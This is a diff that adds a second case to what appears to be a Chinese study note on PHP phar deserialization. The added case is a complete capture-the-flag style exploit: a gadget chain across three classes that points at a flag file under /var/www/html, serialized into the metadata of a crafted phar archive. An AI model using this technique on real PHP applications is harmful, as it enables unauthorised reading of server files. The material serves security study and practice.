@@ -62,3 +62,53 @@ $phardemo = file_get_contents('phar://phartest.phar/test.txt');
 echo $phardemo;
 ```
 
+
+^
+案例2
+
+
+```
+
+<?php
+class C1e4r
+{
+    public $test;
+    public $str;
+    public function __construct($name)
+    {
+        $this->str = $name;
+    }
+}
+
+class Show
+{
+    public $source;
+    public $str;
+    public function __construct($name)
+    {
+        $this->str['str'] = $name;
+    }
+}
+
+class Test
+{
+    public $params;
+    public function __construct()
+    {
+        $this->params['source'] = '/var/www/html/f1ag.php';		// 一定要是绝对路径
+    }
+}
+
+$c = new Test;
+$b = new Show($c);
+$a = new C1e4r($b);
+echo base64_encode(serialize($a)); //test
+
+$phar = new Phar("phar.phar");
+$phar->startBuffering();
+$phar->setStub("__HALT_COMPILER(); ?>");
+$phar->setMetadata($a);
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
+```
+
